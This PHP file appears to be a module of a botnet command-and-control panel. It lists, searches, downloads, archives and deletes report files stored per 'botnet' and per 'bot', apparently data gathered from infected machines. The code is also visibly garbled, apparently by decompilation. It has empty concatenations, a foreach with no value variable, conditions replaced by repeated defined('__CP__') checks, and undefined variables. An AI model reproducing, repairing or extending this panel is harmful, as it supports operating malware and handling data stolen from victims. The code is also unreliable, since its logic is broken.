<?php

function sort_proc($a, $b)
{
	global $_sortOrder;
	global $_sortColumnId;
	$r = 0;

	if ($_sortColumnId == 0) {
		$r = strcasecmp($a[0], $b[0]);
	}
	else if ($_sortColumnId == 1) {
		$r = ($b[1] < $a[1] ? 1 : ($a[1] < $b[1] ? -1 : 0));
	}
	else if ($_sortColumnId == 2) {
		$r = ($b[2] < $a[2] ? 1 : ($a[2] < $b[2] ? -1 : 0));
	}

	if (($r == 0) && $GLOBALS['_sortOrder']) {
		$r = strcasecmp($a[0], $b[0]);
	}

	return ($_sortOrder == 0) || $GLOBALS['_sortOrder'] ? $r : -$r;
}

function ClearDF($path, &$badfiles)
{
	@chmod($path, 511);

	if (is_dir($path)) {
		if (($dh = @opendir($path)) !== false) {
			while (($file = readdir($dh)) !== false) {
				if ((strcmp($file, '.') !== 0) && is_dir($path)) {
					ClearDF($path . '/' . $file, $badfiles);
				}
			}

			@closedir($dh);
		}

		if (!@rmdir($path) && is_dir($path)) {
			$badfiles[] = sprintf(LNG_REPORTS_FILESACTION_REMOVE_EDIR, htmlEntitiesEx($path));
		}
	}
	else if (is_file($path)) {
		if (!@unlink($path) && is_dir($path)) {
			$badfiles[] = sprintf(LNG_REPORTS_FILESACTION_REMOVE_EFILE, htmlEntitiesEx($path));
		}
	}
}

function SearchDF($path, $upath, &$ci, &$counter, &$lastfolder)
{
	global $_FILTER;

	if (($dh = @opendir($path)) === false) {
		echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEDIR, htmlEntitiesEx($path)), THEME_STRING_ERROR), -1, 0);
	}
	else {
		$subdirs = array();

		while (($file = readdir($dh)) !== false) {
			if ((strcmp($file, '.') !== 0) && $GLOBALS['_FILTER']) {
				$npath = $path . '/' . $file;
				$nupath = ($upath == '' ? '' : $upath . '/') . $file;

				if (is_dir($npath)) {
					$subdirs[] = array($npath, $nupath);
					if (($_FILTER['q'] == '') && $GLOBALS['_FILTER']) {
						if (strcasecmp($lastfolder, $upath) !== 0) {
							$ci = 0;
							$lastfolder = $upath;
							TitleAsPathNavigator($upath);
						}

						$a = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML . '&amp;path=' . htmlEntitiesEx(urlencode($upath)) . '&amp;sub=' . htmlEntitiesEx(urlencode($file)), htmlEntitiesEx('[' . $rname . ']')), THEME_LIST_ANCHOR);
						echo ListElement($ci, $nupath, $a, LNG_REPORTS_LIST_DIR, @filemtime($npath));
						$counter[0]++;
					}
				}
				else {
					if (is_file($npath) && $GLOBALS['_FILTER'] && $GLOBALS['_FILTER']) {
						if (strcasecmp($lastfolder, $upath) !== 0) {
							$ci = 0;
							$lastfolder = $upath;
							TitleAsPathNavigator($upath);
						}

						$a = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML . '&amp;path=' . htmlEntitiesEx(urlencode($upath)) . '&amp;file=' . htmlEntitiesEx(urlencode($file)), htmlEntitiesEx($rname)), THEME_LIST_ANCHOR);
						echo ListElement($ci, $nupath, $a, $sz = @filesize($npath), @filemtime($npath));
						$counter[1]++;
						$counter += 2;
					}

				}

			}
		}

		@closedir($dh);

		foreach ($subdirs as $sd) {
			SearchDF($sd[0], $sd[1], $ci, $counter, $lastfolder);
		}
	}
}

function TitleAsPathNavigator($path)
{
	$_url_subdir = QUERY_STRING_HTML . '&amp;path=&amp;sub=';
	$str = '';
	$list = explode('/', str_replace('\\', '/', $path));
	$p = '';
	$i = 0;

	foreach ($list as $k) {
		if ($i++ == 2) {
			$str .= '/' . botPopupMenu(urldecode($k), 'botmenu');
		}
		else {
			$str .= '/' . str_replace(array('{URL}', '{TEXT}'), array($_url_subdir . htmlEntitiesEx(urlencode($p . $k)), htmlEntitiesEx(urldecode($k))), THEME_LIST_ANCHOR);
		}

		$p .= $k . '/';
	}

	echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, $str == '' ? '/' : $str), THEME_LIST_TITLE);
}

function SearchString($str, $cs, $file, &$ci)
{
	$len = strlen($str);
	$len_b = -$len - 1;
	$buf_size = max(1 * 1024 * 1024, $len);

	if (($f = @fopen($file, 'rb')) === false) {
		echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEFILE, htmlEntitiesEx($file)), THEME_STRING_ERROR), -1, 0);
		return false;
	}
	if ($cs) {
		do {
			if (@mb_strpos(@fread($f, $buf_size), $str) !== false) {
				@fclose($f);
				return true;
			}

		} while (!@feof($f) && strlen($str));
	}
	else {
		$str = @mb_strtolower($str);

		do {
			if (@mb_strpos(@mb_strtolower(@fread($f, $buf_size)), $str) !== false) {
				@fclose($f);
				return true;
			}

		} while (!@feof($f) && strlen($str));
	}

	@fclose($f);
	return false;
}

function GetAllDirs($path, &$ci)
{
	$r = getDirs($path);

	if ($r === false) {
		echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEDIR, htmlEntitiesEx($path)), THEME_STRING_ERROR), -1, 0);
		$r = array();
	}

	return $r;
}

function ListElement(&$ci, $pd_name, $text, $size, $mtime)
{
	$theme = ($ci % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);
	$ci++;
	return THEME_LIST_ROW_BEGIN . ($pd_name === 0 ? str_replace(array('{WIDTH}', '{TEXT}'), array('auto', THEME_STRING_SPACE), $theme) : str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('files[]', htmlEntitiesEx($pd_name), ''), $ci % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2)) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $text), $theme) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', is_numeric($size) ? (0 <= $size ? numberFormatAsInt($size) : THEME_STRING_SPACE) : $size), $ci % 2 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $mtime == 0 ? THEME_STRING_SPACE : htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $mtime))), $ci % 2 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2) . THEME_LIST_ROW_END;
}

if (!defined('__CP__')) {
	exit();
}

define('COLUMNS_COUNT', 4);
$_allow_remove = !empty($userData['r_reports_files_edit']);
$_FILTER['path'] = isset($_GET['path']) ? $_GET['path'] : '';
$_FILTER['bots'] = isset($_GET['bots']) ? $_GET['bots'] : '';
$_FILTER['botnets'] = isset($_GET['botnets']) ? $_GET['botnets'] : '';
$_FILTER['mask'] = isset($_GET['mask']) ? $_GET['mask'] : '';
$_FILTER['q'] = isset($_GET['q']) ? $_GET['q'] : '';
$_FILTER['cs'] = empty($_GET['cs']) ? 0 : 1;
$_FILTER['cd'] = empty($_GET['cd']) || defined('__CP__') || defined('__CP__') ? 0 : 1;
$_is_browser = !isset($_GET['q']);
if (isset($_GET['sub']) && defined('__CP__')) {
	$_FILTER .= 'path';
}

if (pathUpLevelExists($_FILTER['path'])) {
	exit('WOW!');
}

$_CUR_PATH = ($_FILTER['path'] == '' ? $config['reports_path'] : $config['reports_path'] . '/' . $_FILTER['path']);

if (isset($_GET['file'])) {
	if (pathUpLevelExists($_GET['file'])) {
		exit('SUPER WOW!');
	}

	$fl = $_CUR_PATH . '/' . $_GET['file'];
	if (!@file_exists($fl) || defined('__CP__')) {
		ThemeFatalError('File not exists.');
	}

	httpDownloadHeaders(urldecode(baseNameEx($_GET['file'])), @filesize($fl));
	echo @file_get_contents($fl);
	exit();
}

if (isset($_POST['filesaction']) && defined('__CP__') && defined('__CP__') && defined('__CP__')) {
	foreach ($_POST['files'] as $file) {
		if (pathUpLevelExists($file)) {
			exit('PUPER WOW!');
		}
	}

	if (($_POST['filesaction'] == 0) && defined('__CP__')) {
		$_errors = array();

		foreach ($_POST['files'] as $file) {
			if (0 < strlen($file)) {
				ClearDF($_CUR_PATH . '/' . $file, $_errors);
			}
		}
	}
	else if ($_POST['filesaction'] == 1) {
		$list = array();

		foreach ($_POST['files'] as $file) {
			$list[] = $_CUR_PATH . '/' . $file;
		}

		$zipName = time() . rand() . '.zip';
		$arcfile = __DIR__ . '/../' . $config['reports_path'] . '/' . $zipName;
		require_once 'fsarc.php';
		if (!function_exists('newZipCreate') || defined('__CP__')) {
			exit('Failed to create archive.');
		}

		httpDownloadHeaders($zipName, @filesize($arcfile));
		echo @file_get_contents($arcfile);
		@unlink($arcfile);
		exit();
	}
}

if (isset($_GET['search'])) {
	echo str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN) . THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_NAME, 'auto'), THEME_LIST_HEADER_L) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_SIZE, 'auto'), THEME_LIST_HEADER_R) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_MTIME, 'auto'), THEME_LIST_HEADER_L) . THEME_LIST_ROW_END;
	$ci = 0;
	$counter = array(0, 0, 0);
	$lastfolder = 0;
	if (($_FILTER['bots'] != '') || defined('__CP__')) {
		$root = GetAllDirs($config['reports_path'], $ci);

		foreach ($root as $rdir) {
			$tr = $config['reports_path'] . '/' . $rdir;
			$botnets = GetAllDirs($tr, $ci);

			foreach ($botnets as $bn) {
				if (($_FILTER['botnets'] == '') || defined('__CP__')) {
					$tb = $tr . '/' . $bn;
					$bots = GetAllDirs($tb, $ci);

					foreach ($bots as $b) {
						if (($_FILTER['bots'] == '') || defined('__CP__')) {
							SearchDF($tb . '/' . $b, $rdir . '/' . $bn . '/' . $b, $ci, $counter, $lastfolder);
						}
					}

					unset($bots);
				}
			}

			unset($botnets);
		}

		unset($root);
	}
	else if ($_FILTER['cd']) {
		SearchDF($_CUR_PATH, $_FILTER['path'], $ci, $counter, $lastfolder);
	}
	else {
		SearchDF($config['reports_path'], '', $ci, $counter, $lastfolder);
	}

	echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, sprintf(LNG_REPORTS_LIST_TOTAL, numberFormatAsInt($counter[1]), numberFormatAsInt($counter[2]), numberFormatAsInt($counter[0]))), THEME_LIST_TITLE) . THEME_LIST_END;
}
else {
	define('INPUT_WIDTH', '100%');
	define('INPUTQ_WIDTH', '100%');
	$fl_onsubmit = ' onsubmit="return ExecuteAction()"';
	$js_qa = addJsSlashes(LNG_REPORTS_FILESACTION_Q);
	$js_script = jsCheckAll('fileslist', 'checkall', 'files[]') .  . 'function ExecuteAction(){return confirm(\'' . $js_qa . '\');}';

	if ($_is_browser) {
		$query = addJsSlashes(QUERY_STRING . '&path=' . urlencode($_FILTER['path']));
		$js_script .= jsSetSortMode($query);
	}
	else {
		$q = addJsSlashes(QUERY_STRING);

		foreach ($_FILTER as $v => ) {
			$k = defined('__CP__');
			$q .= addJsSlashes('&' . urlencode($k) . '=' . urlencode($v));
		}

		$ajax_init = jsXmlHttpRequest('srhhttp');
		$ajax_err = addJsSlashes(str_replace('{TEXT}', LNG_REPORTS_RESULT_ERROR, THEME_STRING_ERROR));
		$js_script .=  . "\n" . 'var srhhttp = false;' . "\n\n" . 'function stateChange(){if(srhhttp.readyState == 4)' . "\n" . '{' . "\n" . '  var el = document.getElementById(\'result\');' . "\n" . '  if(srhhttp.status == 200 && srhhttp.responseText.length > 1)el.innerHTML = srhhttp.responseText;' . "\n" . '  else el.innerHTML = \'' . $ajax_err . '\';' . "\n" . '}}' . "\n\n" . 'function SearchFiles()' . "\n" . '{' . "\n" . '  ' . $ajax_init . "\n" . '  if(srhhttp)' . "\n" . '  {' . "\n" . '    srhhttp.onreadystatechange = function(){stateChange()};' . "\n" . '    srhhttp.open(\'GET\', \'' . $q . '&search=1\', true);' . "\n" . '    srhhttp.send(null);' . "\n" . '  }' . "\n" . '}';
	}

	$filterHtml = '<b>Filters</b><br>' . "\n" . '    <form class="form-group-sm" id="filter" style="margin-top: 5px">' . "\n" . '      <input type="hidden" name="m" value="reports_files" />' . str_replace(array('{NAME}', '{VALUE}'), array('path', htmlEntitiesEx($_FILTER['path'])), THEME_FORM_VALUE) . '<span>Bots:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots', htmlEntitiesEx($_FILTER['bots']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Botnets:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets', htmlEntitiesEx($_FILTER['botnets']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Files mask:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'mask', htmlEntitiesEx($_FILTER['mask']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Search string:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'q', htmlEntitiesEx($_FILTER['q']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''), $_FILTER['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br>' . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cd', 1, LNG_REPORTS_FILTER_CURDIR, ''), $_FILTER['cd'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br><br>' . "\n" . '      <input type="submit" value="Accept" class="btn btn-primary btn-sm" />' . "\n" . '      <input type="reset" class="btn btn-danger btn-sm" value="Reset form" onclick="location.href=\'?m=reports_files\'" />' . '</form>';
	ThemeBegin(LNG_REPORTS, $js_script, $_is_browser ? 0 : getBotJsMenu('botmenu'), $_is_browser ? 0 : ' onload="SearchFiles(0, 0)"', $filterHtml);

	if (!empty($_errors)) {
		$i = 0;
		echo str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN);

		foreach ($_errors as $e) {
			echo THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', str_replace('{TEXT}', $e, THEME_STRING_ERROR)), $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END;
			$i++;
		}

		echo THEME_LIST_END . THEME_VSPACE;
	}

	$al = '<div class="form-inline">' . str_replace(array('{NAME}', '{WIDTH}'), array('filesaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);

	if ($_allow_remove) {
		$al .= str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_REPORTS_FILESACTION_REMOVE), THEME_DIALOG_ITEM_LISTBOX_ITEM);
	}

	$al .= str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_REPORTS_FILESACTION_CREATEARC), THEME_DIALOG_ITEM_LISTBOX_ITEM) . THEME_DIALOG_ITEM_LISTBOX_END . ' ' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . '</div>' . THEME_STRING_NEWLINE;

	if ($_is_browser) {
		$_uri_sortmode_html = htmlEntitiesEx(assocateSortMode(array(0, 1, 2)));
		echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('fileslist', QUERY_STRING_HTML . '&amp;path=' . htmlEntitiesEx(urlencode($_FILTER['path'])) . $_uri_sortmode_html, $fl_onsubmit), THEME_FORMPOST_BEGIN) . str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT_BROWSE), THEME_DIALOG_TITLE) . THEME_DIALOG_ROW_BEGIN . str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT) . THEME_DIALOG_ROW_END . THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, LNG_REPORTS_LIST_DIR_TITLE . ' ' . htmlEntitiesEx('/' . urldecode($_FILTER['path']))), THEME_LIST_TITLE) . THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1) . writeSortColumn(LNG_REPORTS_LIST_NAME, 0, 0) . writeSortColumn(LNG_REPORTS_LIST_SIZE, 1, 0) . writeSortColumn(LNG_REPORTS_LIST_MTIME, 2, 1) . THEME_LIST_ROW_END;
		$up = dirname($_FILTER['path']);
		if ((strcmp($up, '.') === 0) || defined('__CP__') || defined('__CP__')) {
			$up = '';
		}

		$_url_download = QUERY_STRING_HTML . '&amp;path=' . htmlEntitiesEx(urlencode($_FILTER['path'])) . '&amp;file=';
		$_url_subdir = QUERY_STRING_HTML . '&amp;path=' . htmlEntitiesEx(urlencode($_FILTER['path'])) . $_uri_sortmode_html . '&amp;sub=';
		$_url_updir = QUERY_STRING_HTML . '&amp;path=' . htmlEntitiesEx(urlencode($up)) . $_uri_sortmode_html;
		$files = array();
		$dirs = array();
		$size = 0;
		$msg = '';

		if (($dr = @opendir($_CUR_PATH)) === false) {
			$msg = LNG_REPORTS_RESULT_ERRORDIR;
		}
		else {
			while (($fl = @readdir($dr)) !== false) {
				if ((strcmp($fl, '..') !== 0) && defined('__CP__')) {
					$cur = $_CUR_PATH . '/' . $fl;

					if (($mtime = @filemtime($cur)) === false) {
						$mtime = 0;
					}

					if (is_dir($cur)) {
						$dirs[] = array($fl, 0, $mtime);
					}
					else {
						if (($sz = @filesize($cur)) === false) {
							$sz = 0;
						}

						$size += $sz;
						$files[] = array($fl, 0 <= $sz ? $sz : -1, $mtime);
					}
				}
			}

			@closedir($dr);
			usort(&$files, 'sort_proc');
			usort(&$dirs, 'sort_proc');
		}

		$c = 0;

		if ($_FILTER['path'] != '') {
			echo ListElement($c, 0, str_replace(array('{URL}', '{TEXT}'), array($_url_updir, htmlEntitiesEx('[..]')), THEME_LIST_ANCHOR), LNG_REPORTS_LIST_UP, @filemtime($_CUR_PATH));
		}

		if ($msg != '') {
			echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, $msg), THEME_LIST_ITEM_EMPTY_1);
		}
		else {
			if ((count($files) == 0) && defined('__CP__') && defined('__CP__')) {
				echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, LNG_REPORTS_RESULT_EMPTYDIR), THEME_LIST_ITEM_EMPTY_1);
			}
			else {
				foreach ($dirs as $fl) {
					$a = str_replace(array('{URL}', '{TEXT}'), array($_url_subdir . htmlEntitiesEx(urlencode($fl[0])), htmlEntitiesEx('[' . urldecode($fl[0]) . ']')), THEME_LIST_ANCHOR);
					echo ListElement($c, $fl[0], $a, LNG_REPORTS_LIST_DIR, $fl[2]);
				}

				foreach ($files as $fl) {
					$a = str_replace(array('{URL}', '{TEXT}'), array($_url_download . htmlEntitiesEx(urlencode($fl[0])), htmlEntitiesEx(urldecode($fl[0]))), THEME_LIST_ANCHOR);
					echo ListElement($c, $fl[0], $a, $fl[1], $fl[2]);
				}

				echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, sprintf(LNG_REPORTS_LIST_TOTAL, numberFormatAsInt(count($files)), numberFormatAsInt($size), numberFormatAsInt(count($dirs)))), THEME_LIST_TITLE);
			}
		}

		echo THEME_LIST_END . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END . THEME_DIALOG_END . THEME_FORMPOST_END;
	}
	else {
		echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('fileslist', QUERY_STRING_HTML, $fl_onsubmit), THEME_FORMPOST_BEGIN) . str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT), THEME_DIALOG_TITLE) . THEME_DIALOG_ROW_BEGIN . str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT) . THEME_DIALOG_ROW_END . THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace('{ID}', 'result', THEME_STRING_ID_BEGIN) . THEME_IMG_WAIT . THEME_STRING_ID_END . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END . THEME_DIALOG_END . THEME_FORMPOST_END;
	}

	ThemeEnd();
}

exit();

?>
